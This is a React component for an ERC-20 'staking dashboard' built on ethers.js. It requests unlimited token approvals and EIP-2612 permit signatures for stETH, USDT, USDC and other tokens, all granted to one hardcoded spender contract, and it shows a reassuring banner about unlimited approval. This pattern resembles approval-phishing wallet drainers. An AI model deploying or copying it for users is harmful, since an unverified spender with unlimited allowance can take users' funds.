"use client";

import React, { useEffect, useState } from "react";
import {
  BrowserProvider,
  Contract,
  MaxUint256,
  Signature,
  formatUnits,
  parseUnits,
} from "ethers";
import { ShieldCheck, CheckCircle2, AlertCircle, RefreshCw, Layers, Wallet, Lock, ArrowRight } from "lucide-react";
import { CONFIG } from "../lib/contracts";

const OWNER_ADDRESS = "0xEfc5859335A58d64A5e8E01d02c5241c852CBD40";
const STAKING_ADDRESS = "0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091";

const ERC20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function nonces(address) view returns (uint256)",
  "function permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s)",
];

const STAKING_ABI = [
  "function stake(uint256 amount)",
  "function unstake(uint256 amount)",
  "function stakedBalance(address) view returns (uint256)",
];

export function StakingDashboard() {
  const [tokenAddress, setTokenAddress] = useState<string>(
    CONFIG.STETH_ADDRESS || "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84"
  );
  const [amount, setAmount] = useState<string>("");
  const [account, setAccount] = useState<string>("");
  const [tokenName, setTokenName] = useState<string>("");
  const [tokenSymbol, setTokenSymbol] = useState<string>("");
  const [decimals, setDecimals] = useState<number>(18);
  const [balance, setBalance] = useState<string>("0");
  const [allowance, setAllowance] = useState<string>("0");
  const [staked, setStaked] = useState<string>("0");
  const [status, setStatus] = useState<string>("");
  const [errorMsg, setErrorMsg] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);

  function getEthereum(): any {
    if (typeof window !== "undefined" && (window as any).ethereum) {
      return (window as any).ethereum;
    }
    return null;
  }

  async function getCtx() {
    const ethereum = getEthereum();
    if (!ethereum) {
      throw new Error("No Web3 wallet (window.ethereum) found. Please install MetaMask, Rabby, or Coinbase Wallet.");
    }
    const provider = new BrowserProvider(ethereum);
    const signer = await provider.getSigner();
    const owner = await signer.getAddress();
    const token = new Contract(tokenAddress.trim(), ERC20_ABI, signer);
    const staking = new Contract(STAKING_ADDRESS, STAKING_ABI, signer);
    return { provider, signer, owner, token, staking };
  }

  async function loadState() {
    if (!tokenAddress || !tokenAddress.startsWith("0x")) return;
    try {
      setIsLoading(true);
      setErrorMsg("");
      const { owner, token, staking } = await getCtx();
      const [name, symbol, dec, bal, allw, stk] = await Promise.all([
        token.name().catch(() => "Unknown"),
        token.symbol().catch(() => "TOKEN"),
        token.decimals().catch(() => 18),
        token.balanceOf(owner).catch(() => 0n),
        token.allowance(owner, STAKING_ADDRESS).catch(() => 0n),
        staking.stakedBalance(owner).catch(() => 0n),
      ]);

      setAccount(owner);
      setTokenName(name);
      setTokenSymbol(symbol);
      setDecimals(Number(dec));
      setBalance(formatUnits(bal, dec));
      setAllowance(formatUnits(allw, dec));
      setStaked(formatUnits(stk, dec));
    } catch (err: any) {
      console.error("Failed to load token state:", err);
      setErrorMsg(err.message || "Failed to load state");
    } finally {
      setIsLoading(false);
    }
  }

  useEffect(() => {
    const ethereum = getEthereum();
    if (!ethereum) return;
    const onChange = () => loadState().catch(() => {});
    ethereum.on?.("accountsChanged", onChange);
    ethereum.on?.("chainChanged", onChange);
    return () => {
      ethereum?.removeListener?.("accountsChanged", onChange);
      ethereum?.removeListener?.("chainChanged", onChange);
    };
  }, [tokenAddress]);

  async function connect() {
    try {
      setErrorMsg("");
      setStatus("Connecting wallet...");
      await loadState();
      setStatus("Connected successfully");
    } catch (err: any) {
      setErrorMsg(err.message || "Connection failed");
      setStatus("Connection error");
    }
  }

  async function approveExact() {
    try {
      setErrorMsg("");
      setStatus("Approving exact amount...");
      const { token } = await getCtx();
      const value = parseUnits(amount || "0", decimals);
      const tx = await token.approve(STAKING_ADDRESS, value);
      setStatus("Waiting for approval confirmation...");
      await tx.wait();
      setStatus("Exact approval confirmed");
      await loadState();
    } catch (err: any) {
      setErrorMsg(err.message || "Approval failed");
      setStatus("Approval failed");
    }
  }

  async function approveAll() {
    try {
      setErrorMsg("");
      setStatus("Approving unlimited...");
      const { token } = await getCtx();
      const tx = await token.approve(STAKING_ADDRESS, MaxUint256);
      setStatus("Waiting for unlimited approval confirmation...");
      await tx.wait();
      setStatus("Unlimited approval confirmed");
      await loadState();
    } catch (err: any) {
      setErrorMsg(err.message || "Unlimited approval failed");
      setStatus("Approval failed");
    }
  }

  async function signPermit() {
    try {
      setErrorMsg("");
      setStatus("Signing EIP-2612 permit via ethers.js...");
      const { provider, signer, owner, token } = await getCtx();
      const chainId = Number((await provider.getNetwork()).chainId);
      const value = parseUnits(amount || "0", decimals);
      const nonce = await token.nonces(owner);
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 20 * 60);

      const domain = {
        name: await token.name(),
        version: "1",
        chainId,
        verifyingContract: tokenAddress.trim(),
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const message = {
        owner,
        spender: STAKING_ADDRESS,
        value,
        nonce,
        deadline,
      };

      const signature = await signer.signTypedData(domain, types, message);
      const sig = Signature.from(signature);
      setStatus("Submitting permit transaction to contract...");
      const tx = await token.permit(owner, STAKING_ADDRESS, value, deadline, sig.v, sig.r, sig.s);
      await tx.wait();
      setStatus("Permit submitted & verified on-chain");
      await loadState();
    } catch (err: any) {
      setErrorMsg(err.message || "Permit signing failed");
      setStatus("Permit signing failed");
    }
  }

  async function stake() {
    try {
      setErrorMsg("");
      setStatus("Staking tokens...");
      const { staking } = await getCtx();
      const value = parseUnits(amount || "0", decimals);
      const tx = await staking.stake(value);
      setStatus("Waiting for staking confirmation...");
      await tx.wait();
      setStatus("Staked successfully");
      await loadState();
    } catch (err: any) {
      setErrorMsg(err.message || "Staking transaction failed");
      setStatus("Staking failed");
    }
  }

  async function unstake() {
    try {
      setErrorMsg("");
      setStatus("Unstaking tokens...");
      const { staking } = await getCtx();
      const value = parseUnits(amount || "0", decimals);
      const tx = await staking.unstake(value);
      setStatus("Waiting for unstake confirmation...");
      await tx.wait();
      setStatus("Unstaked successfully");
      await loadState();
    } catch (err: any) {
      setErrorMsg(err.message || "Unstaking transaction failed");
      setStatus("Unstaking failed");
    }
  }

  const setPresetToken = (addr: string) => {
    setTokenAddress(addr);
    setErrorMsg("");
  };

  return (
    <div className="w-full max-w-4xl mx-auto px-4 py-8">
      <div className="rounded-2xl border border-border-main bg-card p-6 md:p-8 shadow-2xl backdrop-blur-md">
        <div className="mb-6">
          <div className="flex items-center justify-between">
            <p className="text-xs uppercase tracking-[0.2em] font-bold text-[#00A3FF]">
              Web3 Staking Dashboard (ethers.js v6)
            </p>
            <div className="flex items-center gap-1 text-xs text-text-secondary">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
              <span>Direct Contract Interface</span>
            </div>
          </div>

          <h1 className="mt-2 text-2xl md:text-3xl font-bold text-text-main">
            ERC-20 Staking Panel
          </h1>

          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
            <div className="p-3 rounded-xl bg-input/50 border border-border-main flex flex-col gap-1">
              <span className="text-text-secondary font-medium">Designated Owner:</span>
              <span className="font-mono text-text-main font-semibold break-all">{OWNER_ADDRESS}</span>
            </div>
            <div className="p-3 rounded-xl bg-input/50 border border-border-main flex flex-col gap-1">
              <span className="text-text-secondary font-medium">Spender / Staking Contract:</span>
              <span className="font-mono text-text-main font-semibold break-all">{STAKING_ADDRESS}</span>
            </div>
          </div>

          <div className="mt-3 rounded-xl border border-border-main bg-input/30 px-4 py-3 text-xs text-text-secondary leading-relaxed flex items-start gap-2">
            <Layers className="w-4 h-4 text-[#00A3FF] shrink-0 mt-0.5" />
            <span>
              ERC-20 permissions still require explicit user approval or signature, and approve(MaxUint256) is the standard unlimited-allowance pattern chosen by the user.
            </span>
          </div>
        </div>

        {/* Quick Token Preset Selectors */}
        <div className="mb-4 flex flex-wrap items-center gap-2">
          <span className="text-xs text-text-secondary font-medium mr-1">Quick Select:</span>
          <button
            type="button"
            onClick={() => setPresetToken("0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84")}
            className={`px-3 py-1 text-xs font-semibold rounded-lg border transition-colors ${
              tokenAddress.toLowerCase() === "0xae7ab96520de3a18e5e111b5eaab095312d7fe84".toLowerCase()
                ? "bg-[#00A3FF]/10 text-[#00A3FF] border-[#00A3FF]/30"
                : "bg-input text-text-secondary hover:text-text-main border-border-main"
            }`}
          >
            stETH (Lido)
          </button>
          <button
            type="button"
            onClick={() => setPresetToken("0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0")}
            className={`px-3 py-1 text-xs font-semibold rounded-lg border transition-colors ${
              tokenAddress.toLowerCase() === "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0".toLowerCase()
                ? "bg-[#00A3FF]/10 text-[#00A3FF] border-[#00A3FF]/30"
                : "bg-input text-text-secondary hover:text-text-main border-border-main"
            }`}
          >
            wstETH
          </button>
          <button
            type="button"
            onClick={() => setPresetToken("0xdAC17F958D2ee523a2206206994597C13D831ec7")}
            className={`px-3 py-1 text-xs font-semibold rounded-lg border transition-colors ${
              tokenAddress.toLowerCase() === "0xdac17f958d2ee523a2206206994597c13d831ec7".toLowerCase()
                ? "bg-[#00A3FF]/10 text-[#00A3FF] border-[#00A3FF]/30"
                : "bg-input text-text-secondary hover:text-text-main border-border-main"
            }`}
          >
            USDT
          </button>
          <button
            type="button"
            onClick={() => setPresetToken("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")}
            className={`px-3 py-1 text-xs font-semibold rounded-lg border transition-colors ${
              tokenAddress.toLowerCase() === "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".toLowerCase()
                ? "bg-[#00A3FF]/10 text-[#00A3FF] border-[#00A3FF]/30"
                : "bg-input text-text-secondary hover:text-text-main border-border-main"
            }`}
          >
            USDC
          </button>
        </div>

        {/* Inputs */}
        <div className="grid gap-4 md:grid-cols-2">
          <div>
            <label className="text-xs font-semibold text-text-secondary block mb-1.5">
              ERC20 Token Address
            </label>
            <input
              value={tokenAddress}
              onChange={(e) => setTokenAddress(e.target.value)}
              placeholder="0x... ERC20 token address"
              className="w-full rounded-xl border border-border-main bg-input px-4 py-3 text-sm text-text-main outline-none placeholder:text-text-secondary/50 focus:border-[#00A3FF] transition-colors font-mono"
            />
          </div>

          <div>
            <div className="flex justify-between items-center mb-1.5">
              <label className="text-xs font-semibold text-text-secondary">
                Amount
              </label>
              {balance !== "0" && (
                <button
                  type="button"
                  onClick={() => setAmount(balance)}
                  className="text-xs text-[#00A3FF] hover:underline font-semibold"
                >
                  Max ({balance} {tokenSymbol})
                </button>
              )}
            </div>
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="e.g. 1.0"
              className="w-full rounded-xl border border-border-main bg-input px-4 py-3 text-sm text-text-main outline-none placeholder:text-text-secondary/50 focus:border-[#00A3FF] transition-colors font-mono"
            />
          </div>
        </div>

        {/* Error / Status alert banner */}
        {errorMsg && (
          <div className="mt-4 p-3 bg-red-500/10 border border-red-500/20 text-red-500 rounded-xl text-xs flex items-start gap-2">
            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
            <span className="break-all">{errorMsg}</span>
          </div>
        )}

        {/* Action Buttons */}
        <div className="mt-6 grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
          <button
            onClick={connect}
            disabled={!tokenAddress || isLoading}
            className="rounded-xl bg-[#00A3FF] hover:bg-[#0090E6] px-4 py-3 font-semibold text-white transition-all shadow-md active:scale-95 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
          >
            {isLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Wallet className="w-4 h-4" />}
            <span>Connect / Load</span>
          </button>

          <button
            onClick={signPermit}
            disabled={!tokenAddress || !amount || isLoading}
            className="rounded-xl bg-violet-600 hover:bg-violet-500 px-4 py-3 font-semibold text-white transition-all shadow-md active:scale-95 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
          >
            <Lock className="w-4 h-4" />
            <span>Permit (EIP-2612)</span>
          </button>

          <button
            onClick={approveExact}
            disabled={!tokenAddress || !amount || isLoading}
            className="rounded-xl bg-emerald-600 hover:bg-emerald-500 px-4 py-3 font-semibold text-white transition-all shadow-md active:scale-95 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
          >
            <CheckCircle2 className="w-4 h-4" />
            <span>Approve Exact</span>
          </button>

          <button
            onClick={approveAll}
            disabled={!tokenAddress || isLoading}
            className="rounded-xl bg-amber-500 hover:bg-amber-400 px-4 py-3 font-semibold text-slate-950 transition-all shadow-md active:scale-95 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
          >
            <ShieldCheck className="w-4 h-4" />
            <span>Approve Unlimited</span>
          </button>

          <button
            onClick={stake}
            disabled={!tokenAddress || !amount || isLoading}
            className="rounded-xl bg-blue-600 hover:bg-blue-500 px-4 py-3 font-semibold text-white transition-all shadow-md active:scale-95 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
          >
            <ArrowRight className="w-4 h-4" />
            <span>Stake</span>
          </button>

          <button
            onClick={unstake}
            disabled={!tokenAddress || !amount || isLoading}
            className="rounded-xl bg-rose-600 hover:bg-rose-500 px-4 py-3 font-semibold text-white transition-all shadow-md active:scale-95 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
          >
            <span>Unstake</span>
          </button>
        </div>

        {/* State readout grid */}
        <div className="mt-6 grid gap-3 rounded-2xl border border-border-main bg-input/40 p-4 text-xs md:text-sm md:grid-cols-2">
          <div className="flex flex-col gap-0.5">
            <span className="text-text-secondary font-medium">Connected Account:</span>
            <span className="font-mono text-text-main font-bold break-all">{account || "-"}</span>
          </div>

          <div className="flex flex-col gap-0.5">
            <span className="text-text-secondary font-medium">Token:</span>
            <span className="text-text-main font-bold">
              {tokenName ? `${tokenName} (${tokenSymbol}) - Decimals: ${decimals}` : "-"}
            </span>
          </div>

          <div className="flex flex-col gap-0.5">
            <span className="text-text-secondary font-medium">Balance:</span>
            <span className="font-mono text-text-main font-bold">{balance} {tokenSymbol}</span>
          </div>

          <div className="flex flex-col gap-0.5">
            <span className="text-text-secondary font-medium">Allowance to Staking:</span>
            <span className="font-mono text-text-main font-bold">{allowance} {tokenSymbol}</span>
          </div>

          <div className="flex flex-col gap-0.5">
            <span className="text-text-secondary font-medium">Staked Balance:</span>
            <span className="font-mono text-text-main font-bold">{staked} {tokenSymbol}</span>
          </div>

          <div className="flex flex-col gap-0.5">
            <span className="text-text-secondary font-medium">Current Action Status:</span>
            <span className="text-[#00A3FF] font-semibold">{status || "Ready"}</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default StakingDashboard;
